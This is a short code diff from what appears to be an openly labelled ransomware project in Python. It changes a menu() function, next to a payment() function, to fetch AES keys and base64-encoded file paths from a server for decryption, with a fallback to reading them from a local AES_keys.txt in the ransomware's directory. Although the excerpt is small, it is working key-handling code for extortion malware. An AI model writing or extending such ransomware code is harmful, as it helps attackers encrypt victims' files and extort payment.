@@ -78,9 +78,18 @@ def payment():
 
 def menu():
 
+    # or get file from server
     try:
         aes_keys = download_from_server_aes_keys()
-
+        decr = []
+        keys_and_base64_path = aes_keys.split("\n")
+        for k in keys_and_base64_path:
+            j = k.split(' ')
+            aes_key = j[0]
+            path = base64.b64decode(j[1])           
+            decr.append((aes_key, path))
+            
+    # or get from disk
     except:
         decr = []
         with open(ransomware_path + "/AES_keys.txt", 'r') as f:
